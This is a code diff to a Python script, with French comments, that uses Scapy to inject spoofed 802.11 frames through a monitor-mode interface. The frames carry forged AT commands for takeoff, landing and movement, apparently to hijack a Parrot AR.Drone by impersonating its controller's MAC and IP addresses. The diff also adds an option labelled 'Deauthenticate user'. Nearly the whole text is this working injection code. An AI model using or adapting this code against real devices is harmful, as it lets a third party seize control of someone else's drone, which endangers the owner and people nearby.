@@ -25,15 +25,168 @@ from optparse import OptionParser
 #	Definition locale de fonctions :
 def commands():
 	print "Commands available :"
-	print "\tARROW UP : Move forward"
-	print "\tARROW DOWN : Move backward"
-	print "\tARROW RIGHT : Move to the right"
-	print "\tARROW LEFT : Move to the left"
+	print "\tARROW UP \t: Move forward"
+	print "\tARROW DOWN \t: Move backward"
+	print "\tARROW RIGHT \t: Move to the right"
+	print "\tARROW LEFT \t: Move to the left"
 	print "\t--"
 	print "\tZ : Increase vertical position"
 	print "\tS : Decrease vertical position"
 	print "\tQ : Turn left (without movement)"
 	print "\tD : Turn right (without movement)"
+
+###################   ZERO PACKET   ###################
+def zero():
+	global seq
+
+	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
+		addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
+	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
+	seq = seq+1
+	payload = Raw(load='AT*PCMD='+str(seq)+',0,0,0,0,0\r')
+
+	pkt = RadioTap()/dot11h/ipudph/payload
+
+	sendp(pkt,iface='mon0',count=1,verbose=0)
+
+
+###################   DECOLLAGE   ###################
+def takeoff():
+	print "Takeoff !!"
+	global seq
+
+	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
+	 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
+	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
+	seq = seq +1
+	payload = Raw(load='AT*REF='+str(seq)+',290718208\r')
+
+	pkt = RadioTap()/dot11h/ipudph/payload
+		
+	sendp(pkt,iface='mon0',count=1,verbose=0)
+
+###################   ATTERRISSAGE   ###################
+def landing():
+	print "Landing !!"
+	global seq
+	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
+	 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
+	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
+	seq = seq +1
+	payload = Raw(load='AT*REF='+str(seq)+',290717696\r')
+
+	pkt = RadioTap()/dot11h/ipudph/payload
+		
+	sendp(pkt,iface='mon0',count=1,verbose=0)
+
+
+###################   MONTE   ###################
+def up():
+	global seq
+	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
+ 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
+	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
+	seq = seq+1
+	payload = Raw(load='AT*PCMD='+str(seq)+',1,0,0,1045220557,0\r')
+
+	pkt = RadioTap()/dot11h/ipudph/payload
+
+	sendp(pkt,iface='mon0',count=1,verbose=0)
+
+###################   DESCEND   ###################
+def down():
+	global seq
+	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
+ 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
+	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
+	seq = seq+1
+	payload = Raw(load='AT*PCMD='+str(seq)+',1,0,0,-1045220557,0\r')
+
+	pkt = RadioTap()/dot11h/ipudph/payload
+
+	sendp(pkt,iface='mon0',count=1,verbose=0)
+
+###################   TOURNE A DROITE   ###################
+def noseright():
+	global seq
+	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
+ 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
+	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
+	seq = seq+1
+	payload = Raw(load='AT*PCMD='+str(seq)+',1,0,0,0,1045220557\r')
+
+	pkt = RadioTap()/dot11h/ipudph/payload
+
+	sendp(pkt,iface='mon0',count=1,verbose=0)
+
+###################   TOURNE A GAUCHE   ###################
+def noseleft():
+	global seq
+	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
+ 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
+	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
+	seq = seq+1
+	payload = Raw(load='AT*PCMD='+str(seq)+',1,0,0,0,-1045220557\r')
+
+	pkt = RadioTap()/dot11h/ipudph/payload
+
+	sendp(pkt,iface='mon0',count=1,verbose=0)
+
+
+###################   RECULE   ###################
+def recule():
+	global seq
+	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
+	 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
+	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
+	seq = seq+1
+	payload = Raw(load='AT*PCMD='+str(seq)+',1,0,-1045220557,0,0\r')
+
+	pkt = RadioTap()/dot11h/ipudph/payload
+		
+	sendp(pkt,iface='mon0',count=1,verbose=0)
+
+###################   AVANCE   ###################
+def avance():
+	global seq
+	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
+	 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
+	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
+	seq = seq+1
+	payload = Raw(load='AT*PCMD='+str(seq)+',1,0,1045220557,0,0\r')
+
+	pkt = RadioTap()/dot11h/ipudph/payload
+		
+	sendp(pkt,iface='mon0',count=1,verbose=0)
+
+
+###################   DEPLACE A DROITE   ###################
+def droite():
+	global seq
+	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
+	 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
+	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
+	seq = seq+1
+	payload = Raw(load='AT*PCMD='+str(seq)+',1,1045220557,0,0,0\r')
+
+	pkt = RadioTap()/dot11h/ipudph/payload
+		
+	sendp(pkt,iface='mon0',count=1,verbose=0)
+
+
+###################   DEPLACE A GAUCHE   ###################
+def gauche():
+	global seq
+	dot11h = Dot11(subtype=8L, type='Data', FCfield='to-DS+retry', addr1='90:03:b7:fd:22:49', addr2='50:55:27:ef:e9:6d', 
+	 	addr3='90:03:b7:fd:22:49', addr4=None)/Dot11QoS()/LLC()/SNAP()
+	ipudph = IP(proto='udp', src='192.168.1.2', dst='192.168.1.1')/UDP(sport='freeciv', dport='freeciv')
+	seq = seq+1
+	payload = Raw(load='AT*PCMD='+str(seq)+',1,-1045220557,0,0,0\r')
+
+	pkt = RadioTap()/dot11h/ipudph/payload
+		
+	sendp(pkt,iface='mon0',count=1,verbose=0)
+
 
 
 
@@ -69,7 +222,12 @@ parser.add_option("-c",
 				  dest="commands",
 				  action="store_true",
                   default=False,
-                  help="Print all commands available",)
+                  help="Print all flying commands available",)
+parser.add_option("-d",
+				  dest="deauth",
+				  action="store_true",
+                  default=False,
+                  help="Deauthenticate user",)
 (options, args) = parser.parse_args()
 
 if len(args) > 4:
@@ -77,6 +235,7 @@ if len(args) > 4:
 
 # ip_drone = '192.168.1.1'
 # MAC_drone = '90:03:b7:fd:22:49'
+seq = 1000
 ip_src = options.ip_address
 MAC_src = options.MAC_address
 interface = options.interface
@@ -104,9 +263,9 @@ while running:
                 running = False
             # takeoff / land
             elif event.key == pygame.K_RETURN:
-                print "takeoff"
+				takeoff()
             elif event.key == pygame.K_SPACE:
-                print "land"
+				landing()
             # emergency
             # elif event.key == pygame.K_BACKSPACE:
             #     drone.reset()
@@ -118,18 +277,39 @@ while running:
             # Tourne a gauche / droite (pas de deplacement)
             elif event.key == pygame.K_q:
                 print "Tourne a gauche"
+                # zero()
+                # time.sleep(0.4)
+            	for i in xrange(1,10):
+            		noseleft()
+            		time.sleep(0.1)
+            	# zero()
             elif event.key == pygame.K_d:
                 print "Tourne a droite"
+                for i in xrange(1,10):
+            		noseright()
+            		time.sleep(0.1)
             # Avance / Recule
             elif event.key == pygame.K_UP:
             	print "Avance"
+            	for i in xrange(1,10):
+            		avance()
+            		time.sleep(0.1)
             elif event.key == pygame.K_DOWN:
             	print "Recule"
+            	for i in xrange(1,10):
+            		recule()
+            		time.sleep(0.1)
             # Deplacement a gauche / roite
             elif event.key == pygame.K_LEFT:
             	print "Deplace a gauche"
+            	for i in xrange(1,10):
+            		gauche()
+            		time.sleep(0.1)
             elif event.key == pygame.K_RIGHT:
             	print "Deplace a droite"
+            	for i in xrange(1,10):
+            		droite()
+            		time.sleep(0.1)
             # speed
             # elif event.key == pygame.K_1:
             #     drone.speed = 0.1
